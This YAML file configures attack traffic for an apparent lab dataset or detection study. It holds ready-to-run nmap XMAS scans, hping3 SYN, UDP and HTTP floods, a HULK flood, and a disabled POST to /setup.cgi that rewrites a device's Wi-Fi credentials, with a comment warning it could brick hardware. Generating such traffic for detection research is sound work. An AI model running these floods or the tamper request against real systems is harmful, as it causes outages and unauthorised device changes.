attacks:
  - name: xmas_flood
    label: XMAS_Flood
    enabled: true
    repeats: 3
    command:
      - nmap
      - -sX
      - -p
      - 1-100
      - "{target_ip}"

  - name: tcp_syn_flood
    label: TCP_SYN_Flood
    enabled: true
    repeats: 3
    command:
      - hping3
      - -S
      - -c
      - "100"
      - -p
      - "443"
      - "{target_ip}"

  - name: udp_flood
    label: UDP_Flood
    enabled: true
    repeats: 3
    command:
      - hping3
      - --udp
      - -c
      - "100"
      - -p
      - "53"
      - "{target_ip}"

  - name: http_flood
    label: HTTP_Flood
    enabled: true
    repeats: 3
    command:
      - hping3
      - -S
      - -c
      - "100"
      - -p
      - "80"
      - "{target_ip}"

  # Original FIRCE Concept drift
  - name: hulk_http_flood
    label: HULK_HTTP_Flood
    kind: hulk
    enabled: true
    repeats: 3
    duration_seconds: 60

  # Impact beyond flooding (#80)
  # Left disabled by default (and the config_tamper kind itself defaults to
  # enabled: false at the model level) - the request below is real and
  # protocol-correct, but whether it actually changes anything depends on
  # each specific device's firmware. Do not flip enabled: true without
  # vetting this exact path/body against the specific device it will run
  # against; a payload that succeeds could brick real lab hardware.
  - name: config_tamper_setup_cgi
    label: Config_Tamper_Setup_CGI
    kind: config_tamper
    enabled: false
    repeats: 1
    port: 80
    path: /setup.cgi
    method: POST
    body: "ssid=capex-test&wpa_psk=capex-test-tamper"
    timeout_seconds: 5

